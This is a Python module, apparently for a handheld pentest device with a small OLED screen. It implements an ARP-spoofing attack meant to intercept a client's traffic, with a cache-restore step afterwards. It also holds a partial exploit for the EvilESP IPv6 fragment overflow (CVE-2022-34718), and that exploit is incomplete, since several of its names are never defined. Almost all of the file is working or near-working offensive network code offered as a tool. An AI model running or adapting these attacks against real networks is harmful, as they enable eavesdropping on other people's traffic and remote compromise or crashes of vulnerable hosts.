from scapy.all import ARP, Ether, srp, send
from time import sleep
from core.SH1106.screen import checkIfKey, screenConsole, waitForKey
from threading import Thread

def mac(ip):
    frame = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
    ans, _ = srp(frame, timeout=3, verbose=0)
    if ans: return ans[0][1].src

def arpSpoof(args:list):
    """inspo from bettercap, code from from thepythoncode"""
    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]

    sc = screenConsole(draw, disp, image)
    Thread(target=sc.start, daemon=True).start()

    sentArpPairFrames = 0

    RHOSTS = "127.0.0.1"
    LHOSTS = "127.0.0.1"

    target2Host = ARP(pdst=RHOSTS, hwdst=mac(RHOSTS), psrc=LHOSTS, op='is-at')
    host2Target = ARP(pdst=LHOSTS, hwdst=mac(LHOSTS), psrc=RHOSTS, op='is-at')

    while True:
        send(target2Host, verbose=0)
        send(host2Target, verbose=0)
        sentArpPairFrames += 2
        sc.text = "arp frames: {}\nRHOSTS: {}\nLHOSTS: {}".format(sentArpPairFrames, RHOSTS, LHOSTS)
        sleep(1)
        if checkIfKey(GPIO): break

    sc.text = "restoring network.."

    #restore
    tMAC = mac(RHOSTS)
    hMAC = mac(LHOSTS)

    restore1 = ARP(pdst=RHOSTS, hwdst=tMAC, psrc=LHOSTS, hwsrc=hMAC, op="is-at")
    restore2 = ARP(pdst=LHOSTS, hwdst=hMAC, psrc=RHOSTS, hwsrc=tMAC, op="is-at")

    send(restore1, verbose=0, count=7)
    send(restore2, verbose=0, count=7)

    sc.text = "waiting for your key..."
    sc.exit()

    waitForKey(GPIO)
    while checkIfKey(GPIO): pass

def evilESP(args:list):
    """evil esp cve-2022-34718: source from https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/ slightly modified"""

    RHOSTS = ''
    LHOSTS = ''
    fragSize = 8

    IP = IPv6(src=LHOSTS, dst=RHOSTS)

    dataSize = max(fragSize*2, 0x200)

    LOL = ICMPv6EchoRequest(data="A"*dataSize)

    FH = IPv6ExtHdrFragment()

    packets=fragment6(IP/FH/LOL, fragSize)

    for p in packets:
        p[IPv6ExtHdrFragment].nh = 0x41 # overflow write
        lol1 = sa.encrypt(p)
        send(lol1, verbose=0)

def functions():
    return {
        "network": {
            "arpSpoof": "arp spoof a client and sniff their traffic"
        }
    }